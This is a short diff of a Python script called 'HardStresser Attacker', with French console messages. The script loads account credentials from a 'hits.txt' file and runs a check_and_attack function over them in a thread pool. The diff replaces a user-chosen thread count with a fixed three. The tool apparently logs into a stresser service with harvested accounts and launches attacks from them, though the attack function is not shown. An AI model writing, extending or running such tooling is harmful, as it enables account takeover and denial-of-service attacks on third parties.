@@ -74,14 +74,11 @@ def check_and_attack(username, password):
 if __name__ == "__main__":
     print("=== HardStresser Attacker ===\n")
 
-    t = input("Nombre de threads (defaut 50): ").strip()
-    threads = int(t) if t.isdigit() else 50
-
     logins = parse_hits()
     print(f"[*] {len(logins)} comptes charges depuis hits.txt")
-    print(f"[*] Lancement avec {threads} threads...\n")
+    print(f"[*] Lancement avec 3 threads...\n")
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
         futures = [executor.submit(check_and_attack, u, p) for u, p in logins]
         concurrent.futures.wait(futures)
 
